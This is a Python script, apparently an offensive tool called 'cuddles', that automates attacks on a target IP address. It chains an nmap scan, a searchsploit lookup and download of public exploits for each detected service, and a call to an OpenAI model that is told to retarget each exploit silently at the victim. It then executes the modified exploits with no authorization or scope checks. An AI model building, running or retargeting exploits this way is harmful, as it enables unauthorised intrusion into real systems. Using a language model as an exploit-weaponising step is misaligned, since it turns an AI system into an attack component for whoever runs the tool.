import os
import subprocess
import re
from openai import OpenAI

# Custom exception class
class CuddlesException(Exception):
    pass

# Ensure the OpenAI API key is set
api_key = os.getenv("OPENAI_API_KEY")
if not api_key:
    raise CuddlesException("OpenAI API key not set in environment variables")

# Set the TOKENIZERS_PARALLELISM environment variable to false
os.environ["TOKENIZERS_PARALLELISM"] = "false"

# Initialize the OpenAI client
client = OpenAI()

# ASCII Art Function
def cuddles_art():
    art = """
   ▄████████ ▀████    ▐████▀   ▄▄▄▄███▄▄▄▄    ▄██████▄  ████████▄  ████████▄     ▄████████    ▄████████ 
  ███    ███   ███▌   ████▀  ▄██▀▀▀███▀▀▀██▄ ███    ███ ███   ▀███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀     ███  ▐███    ███   ███   ███ ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄        ▀███▄███▀    ███   ███   ███ ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀        ████▀██▄     ███   ███   ███ ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    █▄    ▐███  ▀███    ███   ███   ███ ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████ 
  ███    ███  ▄███     ███▄  ███   ███   ███ ███    ███ ███   ▄███ ███   ▄███   ███    ███   ███    ███ 
  ██████████ ████       ███▄  ▀█   ███   █▀   ▀██████▀  ████████▀  ████████▀    ██████████   ███    ███ 
                                                                                             ███    ███                                                                                   
"""
    return art

# Input validation functions
def validate_ip(value):
    ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    return re.match(ip_pattern, value)

# Function to get user input with validation
def get_user_input(prompt, validator=None):
    while True:
        response = input(prompt)
        if not response:
            return "Not provided"
        if validator is None or validator(response):
            return response
        print("Invalid input. Please try again.")

# Function to parse nmap results for open ports and service details
def parse_nmap_results(scan_results):
    open_ports = []
    service_info = []
    for line in scan_results.split('\n'):
        if '/tcp' in line and 'open' in line:
            parts = line.split()
            port = parts[0].split('/')[0].strip()
            service = parts[2]
            version = ' '.join(parts[3:]) if len(parts) > 3 else ''
            open_ports.append(int(port))
            service_info.append((port, service, version))
    return open_ports, service_info

# Function to run nmap scan with real-time output
def run_nmap_scan(ip):
    try:
        command = f"nmap {ip} -sV"
        print("\nRunning nmap command:")
        print(command)
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        
        output = ""
        for line in iter(process.stdout.readline, ''):
            print(line, end='')
            output += line
        
        process.stdout.close()
        return_code = process.wait()
        
        if return_code != 0:
            raise CuddlesException(f"nmap command failed with return code {return_code}")
        
        return output
    except Exception as e:
        raise CuddlesException(f"nmap command failed: {str(e)}")

# Function to search ExploitDB for exploits
def search_exploitdb(service):
    search_query = f"{service}"
    print(f"Searching ExploitDB for: {search_query}")
    result = subprocess.run(f"searchsploit {search_query}", shell=True, capture_output=True, text=True)
    print(f"Searchsploit result: {result.stdout}")
    return result.stdout

# Function to download exploits using searchsploit
def download_exploit(path):
    print(f"Downloading exploit from path: {path}")
    result = subprocess.run(f"searchsploit -m {path}", shell=True, capture_output=True, text=True)
    print(f"Download result: {result.stdout}")
    return result.returncode == 0

# Function to modify exploits using LLM
def modify_exploit_with_llm(exploit_code, ip, port):
    prompt = f"""
    Modify the following exploit to target IP {ip} and port {port}:

    Exploit:
    {exploit_code}

    Ensure the exploit points to the correct target and include any necessary adjustments but only respond with the modified exploit, no comments or analysis, just the code.
    """
    try:
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000
        )
        modified_exploit = response.choices[0].message.content.strip()
        print(f"Modified exploit: {modified_exploit}")
        return modified_exploit
    except Exception as e:
        raise CuddlesException(f"Error modifying exploit with LLM: {str(e)}")

# Function to write exploit to a file
def write_exploit_to_file(exploit_code, filename):
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'w') as file:
            file.write(exploit_code)
        print(f"Exploit written to file: {filename}")
    except Exception as e:
        raise CuddlesException(f"Error writing exploit to file: {str(e)}")

# Function to run exploit
def run_exploit(filename, ip, port):
    try:
        result = subprocess.run(f"python3 {filename} {ip} {port}", shell=True, capture_output=True, text=True)
        print(f"Exploit run result: {result.stdout}")
        if result.stderr:
            print(f"Exploit run error: {result.stderr}")
        return result.stdout
    except Exception as e:
        raise CuddlesException(f"Error running exploit: {str(e)}")

# Main function
def main():
    try:
        print(cuddles_art())
        print("Welcome to cuddles. Please provide the IP address of the target.")
        
        ip = get_user_input("Please enter the IP address: ", validate_ip)
        if ip == "Not provided":
            raise CuddlesException("IP address is required. Exiting.")
        
        # Stage 1: Run Nmap Scan
        scan_result = run_nmap_scan(ip)
        open_ports, service_info = parse_nmap_results(scan_result)

        print("\nNmap scan results:")
        print(scan_result)

        # Stage 2: Active Phase - Exploit Search, Modification, and Execution
        print("Starting the exploitation phase.")

        for port, service, _ in service_info:
            print(f"Searching for exploits for service: {service}")
            exploits = search_exploitdb(service)
            print(f"ExploitDB results for {service}:\n{exploits}")

            # Extract paths of found exploits
            exploit_paths = [line.split('|')[-1].strip() for line in exploits.split('\n') if '|' in line and not line.startswith('-') and 'Path' not in line]
            print(f"Exploit paths for {service}: {exploit_paths}")

            # Download and modify each exploit
            for path in exploit_paths:
                print(f"Attempting to download exploit: {path}")
                if download_exploit(path):
                    exploit_filename = os.path.basename(path)
                    with open(exploit_filename, 'r') as file:
                        original_exploit_code = file.read()

                    if exploit_filename.endswith('.py'):
                        print(f"Modifying Python exploit: {exploit_filename}")
                        modified_exploit_code = modify_exploit_with_llm(original_exploit_code, ip, port)
                        modified_exploit_filename = os.path.join('tools', 'exploit_mods', f"modified_{exploit_filename}")
                        write_exploit_to_file(modified_exploit_code, modified_exploit_filename)
                        exploit_result = run_exploit(modified_exploit_filename, ip, port)
                        print(f"Exploit results for {service} on port {port}:\n{exploit_result}")
                    else:
                        print(f"Skipping non-Python exploit: {exploit_filename}")

    except CuddlesException as e:
        print(f"Error: {str(e)}")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()
